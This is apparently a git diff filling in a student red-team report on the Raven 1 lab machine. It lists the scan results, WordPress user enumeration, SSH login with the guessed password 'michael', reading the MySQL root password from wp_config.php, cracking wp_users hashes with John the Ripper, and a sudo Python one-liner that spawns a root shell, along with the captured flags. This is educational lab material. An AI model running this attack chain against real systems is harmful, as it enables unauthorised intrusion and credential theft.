@@ -1,45 +1,128 @@
 # Red Team: Summary of Operations
-
+ 
 ## Table of Contents
 - Exposed Services
 - Critical Vulnerabilities
 - Exploitation
-
+ 
 ### Exposed Services
-_TODO: Fill out the information below._
-
+ 
+ 
 Nmap scan results for each machine reveal the below services and OS details:
+ 
+Command: $ nmap -sV 192.168.1.110
+  ![redteam1](https://user-images.githubusercontent.com/91024338/143156404-1f4162a4-e0e5-4385-884b-4daf231ff115.JPG)
 
-```bash
-$ nmap ... # TODO: Add command to Scan Target 1
-  # TODO: Insert scan output
-```
-
+ 
 This scan identifies the services below as potential points of entry:
+ 
 - Target 1
-  - List of
-  - Exposed Services
-
-_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._
-
+ 
+  - Port 22/TCP Open SSH
+  - Port 80/TCP Open HTTP
+  - Port 111/TCP Open rcpbind
+  - Port 139/TCP Open netbios-ssn 
+  - Port 445/TCP Open netbios-ssn
+ 
 The following vulnerabilities were identified on each target:
+ 
 - Target 1
-  - List of
-  - Critical
-  - Vulnerabilities
-
-_TODO: Include vulnerability scan results to prove the identified vulnerabilities._
-
+  - Weak user password
+  - User enumeration (WordPress site)
+  - Unsalted user password hash (WordPress site)
+  - Misconfiguration of user privileges and user escalation
+ 
 ### Exploitation
-_TODO: Fill out the details below. Include screenshots where possible._
-
+ 
 The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
 - Target 1
-  - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
+  - Flag1: b9bbcb33ellb80be759c4e844862482d
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
-  - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
+      - Used WPScan to enumerate users of the Target 1 WordPress site
+	-Used Brute Force to guess Michael’s password
+  - Command:
+      - wpscan --url http://192.168.1.110/wordpress/ --enumerate u
+
+
+
+
+	-Password:michael
+      - SSH in michael: ssh michael@192.168.1.110
+      - cd var/www/html
+      - ls -l
+      - nano service.html (Flag1 located) 
+
+
+ 
+  - Flag2: fc3fd58dcdad9ab23faca6e9a3e581c
     - **Exploit Used**
-      - _TODO: Identify the exploit used_
-      - _TODO: Include the command run_
+      - Used WPScan to enumerate users of the Target 1 WordPress site
+	- Used password from previous Brute Force
+	-Password: michael
+      - ssh michael@192.168.1.110
+      - cd var/www
+      - ls 
+      - cat flag2.txt
+      
+- Flag3:afc01ab56b50591e7dccf93122770cd2
+**Exploit Used**
+Same exploits used to gain Flag 1 and 2:
+Accessing MySQL Database
+-Commands
+	-cd /var/www/html/wordpress
+	-cat wp_config.php
+(screenshot)
+	-mysql -u root -p’R@v3nSecurity’ 
+	-show databases;
+	-use wordpress;
+-show tables;
+	-select * from wp_posts;
+
+ 
+
+
+
+ 
+ 
+Flag4:715dea6c055b9fe3337544932f2941ce
+	-**Exploit used**
+- Used MySQL database to gain access to user credentials.
+- Used John the Ripper to crack the password hash.
+- Used Python to gain root privileges.
+- User credentials are stored in the ‘wp_users table’ in the wordpress database.
+- I copied/saved the usernames and password hashes to my Kali machine in a file named wp_hashes.txt.
+-Commands:
+	-mysql -u root -p’R@v3nSecurity’ 
+	-show databases;
+	-use wordpress;
+	-show tables;
+	-select * from wp_users;
+
+ 
+ 
+-Commands:
+	- cd /usr/share/wordlist
+	- john --wordlist=rockyou.txt wp_hashes.txt
+ 
+
+
+ 
+-Results: 
+-Steven’s password: pink84
+ 
+- After I cracked Steven’s password I SSH as Steven, checked for root      
+  privileges and escalated to root with Python.
+-Commands:
+	-ssh steven@192.168.1.110
+	-password: pink84
+	- sudo -l
+	- sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
+	- cd /root
+	- ls
+	- cat flag4.txt
+
+ 
+ 
+
+ 
+
